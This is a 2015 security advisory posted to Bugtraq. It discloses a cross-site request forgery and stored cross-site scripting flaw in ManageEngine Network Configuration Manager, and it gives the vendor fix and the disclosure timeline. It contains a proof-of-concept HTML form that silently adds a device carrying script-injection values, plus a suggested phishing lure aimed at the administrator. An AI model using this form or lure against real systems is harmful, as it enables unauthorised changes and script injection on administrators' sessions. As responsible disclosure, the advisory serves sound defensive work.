
Date: Sat, 21 Mar 2015 16:34:18 GMT
From: kingkaustubh@...com
To: bugtraq@...urityfocus.com
Subject: Cross-Site Request Forgery (CSRF) Vulnerability in ManageEngine
 Network Configuration

Title:- Cross-Site Request Forgery (CSRF) Vulnerability in ManageEngine Network Configuration Management
Author: Kaustubh G. Padwad
Vendor: ZOHO Corp
Product: ManageEngine Network Configuration Manager 
Tested Version: : Network Configuration Manager Build 11000
Severity: HIGH

About the Product:
==================

Network Configuration Manager is a webï¿½based, multi vendor network change, configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices. Trusted by thousands of network administrators around the world, Network Configuration Manager helps automate and take total control of the entire life cycle of device configuration management.

Description: 
============

This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an device into the application. and device fileds are vulnerable to cross site scripting attack This leads to compromising the whole domain as the application. 

Vulnerability Class:
====================

Cross-Site Request Forgery (CSRF) - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
Cross-Site-Scripting
How to Reproduce: (POC):
========================

* Add follwing code to webserver and send that malicious link to application Admin.

* The admin should be loggedin when he clicks on the link.

( Soical enginering might help here 

* For Example :- Device password has been changed click here to reset

CSRF COde
=========

  <body>

    <form action="http://192.168.1.80:8080/ncmapi/json/settings/addDevice?apiKey=3566c4f7a30732ad4e17a9659c38ba03" method="POST">
      <input type="hidden" name="IPADDRESS" value="192&#46;168&#46;1&#46;1" />
      <input type="hidden" name="SERIES" value="&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="MODEL" value="&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="COLUMNNAME1" value="&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="COLUMNNAME2" value="&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="VENDOR&#95;NAME" value="3Com" />
      <input type="hidden" name="DEVICE&#95;BEHAVIOUR" value="3Com&#32;4200G&#32;Series&#32;Switch" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Mitigation
==========
Download and unzip the fix from the below link:
https://uploads.zohocorp.com/Internal_Useruploads/dnd/NetFlow_Analyzer/o_19ga51p951gblpbs1rkrm211vim1/vulnerabilities_Fix.zip

NCM.zip 

1. Stop the Network Configuration Manager service. 
2. Please replace settingModel.js  under NCM_Home\webapps\netflow\ncmapiclient\ember\models\Settings\settingModel.js with with one under NCM.zip\settingModel.js.
3. Please replace AdvNCM.jar and main.js under NCM_Home\webapps\netflow\ncmapiclient\ember\javascript with the one under NCM.zip



Disclosure: 
===========
04-Mar-2015 Repoerted to vendor
13-Mar-2015 Fixed By Vendor
16-Mar-2015 Requested for CVE ID
21-Mar-2015 Public Disclosed
#credits:
Kaustubh Padwad
Information Security Researcher
kingkaustubh@...com
https://twitter.com/s3curityb3ast
http://breakthesec.com
https://www.linkedin.com/in/kaustubhpadwad


Kaustubh Padwad
Information Security Researcher
kingkaustubh@...com 
https://twitter.com/s3curityb3ast
http://breakthesec.com
https://www.linkedin.com/in/kaustubhpadwad
